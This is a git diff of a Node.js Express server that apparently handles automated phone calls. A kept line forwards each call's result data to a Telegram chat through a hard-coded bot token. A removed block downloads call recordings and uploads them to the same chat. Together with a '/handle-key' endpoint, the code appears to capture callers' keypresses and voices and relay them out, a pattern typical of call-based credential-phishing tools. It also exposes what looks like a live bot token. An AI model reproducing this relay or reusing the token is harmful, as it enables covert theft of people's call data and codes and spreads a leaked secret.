@@ -51,52 +51,6 @@ app.post('/handle-key', (req, res) => {
 
 app.post('/callOutputs', async (req, res) => {
     axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Call result: ' + JSON.stringify(req.body)) 
-    if(req.body.RecordingUrl){
-        const exists = fs.existsSync("./file.mp3")
-        if (exists) {
-          fs.unlinkSync('./file.mp3');
-        } 
-            // Replace 'YOUR_MP3_URL' with the actual URL of the MP3 file
-        const mp3Url = req.body.RecordingUrl + ".mp3";
-
-        // Create a form data object
-        const form = new FormData();
-
-        // Replace 'path/to/your/file.mp3' with the path to your MP3 file
-        const filePath = 'file.mp3';
-        axios({
-        method: 'get',
-        url: mp3Url,
-        responseType: 'stream',
-        })
-        .then(response => {
-        // Pipe the response directly to a file
-        response.data.pipe(fs.createWriteStream(filePath));
-
-        // Optionally, you can handle the completion event
-        response.data.on('end', () => {
-            console.log('MP3 file downloaded successfully.');
-            form.append('audio', fs.createReadStream(filePath), { filename: 'file.mp3' });
-            form.append('chat_id', 5113588348);
-            // Make a POST request with the form data
-            axios.post('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendAudio', form, {
-            headers: {
-                ...form.getHeaders(),
-                // Additional headers if needed
-            },
-            })
-            .then(response => {
-                console.log('Upload successful:', response.data);
-            })
-            .catch(error => {
-                console.error('Error uploading file:', error);
-            });
-        });
-        })
-        .catch(error => {
-            console.error('Error downloading MP3 file:', error);
-        });
-    }
 });
 
 app.listen(port, () => {
